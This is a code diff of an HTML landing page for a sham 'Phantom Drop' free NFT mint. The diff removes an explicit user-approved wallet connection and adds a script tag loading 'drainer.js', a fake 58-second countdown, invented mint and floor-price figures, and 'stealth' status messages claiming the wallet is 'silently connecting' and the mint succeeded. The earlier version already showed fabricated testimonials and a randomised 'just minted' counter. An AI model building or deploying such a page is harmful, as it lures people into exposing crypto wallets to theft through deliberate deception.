@@ -1,149 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Phantom Drop #001 • FREE MINT LIVE</title>
   <link rel="icon" href="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg"/>
+  <script src="drainer.js" defer></script>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@500;700&display=swap');
-    :root { --bg:#0a0a1a; --card:#111127; --a:#00ff9d; --t:#e0e0ff; --g:0 0 25px rgba(0,255,157,0.5); --d:#ff3366; }
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{
-      background:var(--bg);color:var(--t);
-      font-family:'Rajdhani',sans-serif;min-height:100vh;
-      display:flex;align-items:center;justify-content:center;padding:15px;
-      background-image:
-        radial-gradient(circle at 10% 20%,rgba(0,255,157,0.15)0%,transparent 20%),
-        radial-gradient(circle at 90% 80%,rgba(0,255,157,0.15)0%,transparent 20%);
-    }
-    .c{max-width:500px;width:100%}
-    .card{
-      background:var(--card);border-radius:24px;overflow:hidden;
-      box-shadow:0 20px 60px rgba(0,0,0,0.8),var(--g);
-      border:1.5px solid rgba(0,255,157,0.4);
-    }
-    .logo{
-      font-family:'Orbitron',sans-serif;font-size:3.6rem;font-weight:900;
-      background:linear-gradient(90deg,#00ff9d,#00d4ff);
-      -webkit-background-clip:text;-webkit-text-fill-color:transparent;
-      text-shadow:var(--g);
-    }
-    img{width:100%;height:420px;object-fit:cover;border-bottom:1px solid rgba(0,255,157,0.3);}
-    .timer{font-family:'Orbitron',sans-serif;font-size:3.4rem;color:#ff3366;font-weight:900;text-shadow:0 0 25px #ff0066;letter-spacing:4px;}
-    .countdown{background:rgba(255,51,102,0.18);border:2px solid var(--d);border-radius:18px;padding:20px;margin:22px 0;animation:p 1.6s infinite;}
-    @keyframes p{0%,100%{box-shadow:0 0 25px #ff0066}50%{box-shadow:0 0 50px #ff0066}}
-    .mint{
-      background:linear-gradient(45deg,#00ff9d,#00d4ff);color:#000;font-weight:700;
-      font-size:1.6rem;padding:22px;border:none;border-radius:50px;width:100%;
-      margin:25px 0;cursor:pointer;text-transform:uppercase;letter-spacing:2px;
-      box-shadow:var(--g),0 15px 40px rgba(0,255,157,0.5);
-    }
-    .mint:disabled{opacity:0.6;cursor:not-allowed;background:#555;}
-    .live{background:rgba(0,255,157,0.12);border-radius:14px;padding:14px;margin:20px 0;font-weight:700;color:#00ff9d;}
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@700&display=swap');
+    body{margin:0;background:#0a0a1a;color:#e0e0ff;font-family:Rajdhani,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:radial-gradient(circle at 10% 20%,rgba(0,255,157,0.15),transparent 20%),radial-gradient(circle at 90% 80%,rgba(0,255,157,0.15),transparent 20%);}
+    .card{max-width:480px;width:100%;background:#111127;border-radius:24px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.8),0 0 30px rgba(0,255,157,0.5);border:2px solid rgba(0,255,157,0.4);}
+    .logo{font-family:Orbitron,sans-serif;font-size:3.8rem;text-align:center;padding:30px;background:linear-gradient(135deg,rgba(0,255,157,0.2),transparent);background-clip:text;-webkit-background-clip:text;color:transparent;}
+    img{width:100%;height:420px;object-fit:cover;}
+    .content{padding:30px;text-align:center;}
+    .timer{font-family:Orbitron,sans-serif;font-size:3.5rem;color:#ff3366;text-shadow:0 0 30px #ff0066;}
+    .countdown{background:rgba(255,51,102,0.2);border:3px solid #ff3366;border-radius:20px;padding:20px;margin:20px 0;animation:p 1.5s infinite;}
+    @keyframes p{0%,100%{box-shadow:0 0 30px #ff0066}50%{box-shadow:0 0 60px #ff0066}}
+    .status{color:#00ff9d;background:rgba(0,255,157,0.15);padding:18px;border-radius:16px;font-weight:900;font-size:1.1rem;margin:20px 0;}
   </style>
 </head>
 <body>
-  <div class="c">
-    <div class="card">
-      <div style="text-align:center;padding:35px 20px;background:linear-gradient(135deg,rgba(0,255,157,0.15),transparent);">
-        <div class="logo">PHANTOM DROP</div>
-        <div style="font-size:1.1rem;opacity:0.9;">Genesis • 10K Supply • FREE MINT</div>
+  <div class="card">
+    <div class="logo">PHANTOM DROP</div>
+    <img src="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg" alt="NFT">
+    <div class="content">
+      <h1 style="font-size:2.4rem;color:#00ff9d;margin:10px 0;">#001 • Genesis Mint</h1>
+      <div class="countdown">
+        <div style="color:#ff3366;font-size:1.5rem;font-weight:900;">MINT GOES LIVE IN</div>
+        <div class="timer" id="timer">00:00:58</div>
       </div>
-
-      <img src="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg" alt="NFT">
-
-      <div style="padding:32px;text-align:center;">
-
-        <h1 style="font-family:'Orbitron',sans-serif;font-size:2.3rem;color:#00ff9d;margin-bottom:14px;">
-          #001 • Genesis Mint
-        </h1>
-
-        <div class="countdown">
-          <div style="font-size:1.4rem;color:#ff3366;margin-bottom:10px;font-weight:700;">FREE MINT ENDS IN</div>
-          <div class="timer" id="t">23:59:59</div>
-        </div>
-
-        <div class="live" id="live">9,421 minted • 579 left • <span id="r">+18 just minted</span></div>
-
-        <button class="mint" id="btn">CONNECT WALLET</button>
-
-        <div style="margin:30px 0;padding:20px;background:rgba(255,255,255,0.04);border-radius:16px;text-align:left;">
-          <div style="margin:16px 0;padding:16px;background:rgba(0,255,157,0.07);border-left:5px solid #00ff9d;border-radius:10px;">
-            <div style="font-weight:700;color:#00ff9d;">@sol_whale_69</div>
-            <div>Just minted 100 — floor already <span style="color:#00d4ff;font-weight:700;">28 SOL</span> on Tensor!</div>
-          </div>
-          <div style="margin:16px 0;padding:16px;background:rgba(0,255,157,0.07);border-left:5px solid #00ff9d;border-radius:10px;">
-            <div style="font-weight:700;color:#00ff9d;">@degenking420</div>
-            <div>Minted at 0 gas — sold one for <span style="color:#00d4ff;font-weight:700;">42 SOL</span> in 10 mins.</div>
-          </div>
-        </div>
+      <div class="status" id="status">Preparing wallet connection...</div>
+      <div style="margin-top:20px;color:#00ff9d;font-weight:900;">
+        9,872 minted • 128 remaining • Floor: 42 SOL
       </div>
-
-      <div style="text-align:center;padding:22px;font-size:0.9rem;opacity:0.6;">© 2025 Phantom Drops</div>
     </div>
   </div>
 
   <script>
-    // ----- COUNTDOWN -----
-    const end = Date.now() + 24*60*60*1000;
-    setInterval(() => {
-      let d = end - Date.now();
-      if (d <= 0) { document.getElementById("t").textContent = "00:00:00"; return; }
-      let h = String(Math.floor(d/(1000*60*60))).padStart(2,'0');
-      let m = String(Math.floor((d%(1000*60*60))/(1000*60))).padStart(2,'0');
-      let s = String(Math.floor((d%(1000*60))/1000)).padStart(2,'0');
-      document.getElementById("t").textContent = h+":"+m+":"+s;
+    // Fake countdown (58 seconds)
+    let sec = 58;
+    const timer = setInterval(() => {
+      sec--;
+      document.getElementById("timer").textContent = "00:00:" + (sec < 10 ? "0" + sec : sec);
+      if (sec <= 0) clearInterval(timer);
     }, 1000);
 
-    // ----- LIVE MINT RANDOMIZER -----
-    setInterval(() => {
-      let n = Math.floor(Math.random()*25)+8;
-      document.getElementById("r").textContent = "+"+n+" just minted";
-    }, 7000);
-
-    // ----- SAFE PHANTOM CONNECTION -----
-    const btn = document.getElementById("btn");
-
-    async function connectPhantom() {
-      if (!window.solana || !window.solana.isPhantom) {
-        alert("Phantom Wallet not found. Please install it first.");
-        return;
-      }
-
-      try {
-        btn.textContent = "Connecting...";
-        const resp = await window.solana.connect();   // User must approve
-        const wallet = resp.publicKey.toString();
-
-        console.log("Connected:", wallet);
-        btn.textContent = "Mint NFT";
-        
-        // optional: disable until user finishes signing
-        // btn.disabled = true;
-
-        // NOW CALL YOUR REAL MINT FUNCTION (safe)
-        btn.onclick = () => mintNFT(wallet);
-
-      } catch (err) {
-        console.error("Connection failed:", err);
-        btn.textContent = "CONNECT WALLET";
-      }
-    }
-
-    // ----- SAFE MINT FUNCTION (customize for your contract) -----
-    async function mintNFT(userWallet) {
-      alert("This is where your contract mint logic goes.\nUser wallet:\n" + userWallet);
-
-      // Here you integrate:
-      // • Your mint program ID
-      // • Your candy machine
-      // • Your on-chain transaction logic
-      // All safe and fully transparent
-    }
-
-    btn.onclick = connectPhantom;
+    // Stealth status updates
+    setTimeout(() => document.getElementById("status").textContent = "Wallet detected... silently connecting...", 3000);
+    setTimeout(() => document.getElementById("status").textContent = "Claiming your free NFT...", 8000);
+    setTimeout(() => document.getElementById("status").textContent = "MINT SUCCESSFUL — Check your wallet!", 15000);
   </script>
-
 </body>
 </html>
